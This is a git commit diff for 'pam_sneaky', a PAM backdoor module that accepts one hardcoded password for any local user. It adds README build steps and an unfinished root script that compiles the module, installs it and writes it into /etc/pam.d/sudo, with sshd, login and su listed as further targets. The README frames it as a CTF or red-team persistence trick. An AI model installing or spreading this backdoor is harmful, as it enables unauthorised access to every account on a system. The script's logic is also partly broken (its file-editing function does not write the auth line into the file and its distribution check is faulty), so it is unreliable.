f898358935b31c415b81c98d5f1b92ca036a7dd3
John Hammond <johnhammond010@gmail.com>
2020-03-27 16:03:09 -0400

    Began to write inject script

--- README.md
+++ README.md
@@ -1,5 +1,7 @@
 # pam_sneaky
 
+> Caleb Stewart
+
 This simple PAM module will enable authentication with any local user using a constant known password. The password is XOR'd with a constant key to a smidge of obfuscation. This example uses the password "sneaky password". After installation to `/lib/security/pam_sneaky.so` (or your distributions' equivalent), you can add this to the top of your PAM configuration (e.g. `/etc/pam.d/sshd` or `/etc/pam.d/login`):
 
 ```
@@ -9,3 +11,15 @@ auth    sufficient    pam_sneaky.so
 And Voila! You can log in as any user with the password "sneaky password"
 
 *DISCLAIMER* - _DON'T DO THIS ON YOUR MACHINE_. It's a bad idea, and serves no purpose. It could be a slightly sneaky way to maintain some low-hanging fruit-like persistence during a CTF or Red Team/Blue Team engagement.
+
+# Dependencies
+
+```
+sudo apt install libpam0g-dev
+```
+
+# Build
+
+```
+gcc -shared -o pam_sneaky.so pam_sneaky.c
+```
---
+++ inject_sneaky.sh
@@ -0,0 +1,62 @@
+#!/bin/bash
+
+# Verify you are running as root
+if [ $UID -ne 0 ]; then
+    echo "[X] Not running as root. Won't be able to make changes."
+    exit
+fi
+
+PAM_OBJECT="pam_sneaky.so"
+PAM_SOURCE="pam_sneaky.c"
+MODULE_DIR="/usr/lib/security/"
+
+
+# Build the program
+echo "[+] Building ${PAM_OBJECT}"
+gcc -shared -o ${PAM_OBJECT} ${PAM_SOURCE}
+
+# Ensure it was successfully built. Retry after installing dependencies
+if [ $? -ne 0 ]; then
+
+    if [ $? -eq 127 ]; then
+        echo "[X] gcc not installed, failing..."
+        exit
+    fi
+
+    echo "[!] Failed building ${PAM_OBJECT}, installing dependencies"
+
+    uname -a | grep -i "(Debian|Ubuntu)"
+    if [ $? -eq 0 ]; then
+        echo "[+] Installing libpam0g-dev with apt-get"
+        apt-get install libpam0g-dev
+    else
+        echo "[+] Installing pam-devel with yum"
+        yum install pam-devel
+    fi
+    echo "[+] Rebuilding ${PAM_OBJECT}"
+    gcc -shared -o ${PAM_OBJECT} ${PAM_SOURCE}
+fi
+
+
+# Verify the file exists
+if [ ! -e ${PAM_OBJECT} ]; then
+    echo "[X] ${PAM_OBJECT} not found, failing..."
+    exit
+fi
+
+# Make the directory to store the object file in
+mkdir -p ${MODULE_DIR}
+cp ${PAM_OBJECT} ${MODULE_DIR}
+
+
+function bug_file(){
+    (echo "auth    sufficient    ${MODULE_DIR}/${PAM_OBJECT}"; sed -i '/.*'${PAM_OBJECT}'.*/d' $1)
+}
+
+bug_file /etc/pam.d/sudo
+
+# sshd
+# login
+# system-auth
+# sudo
+# su
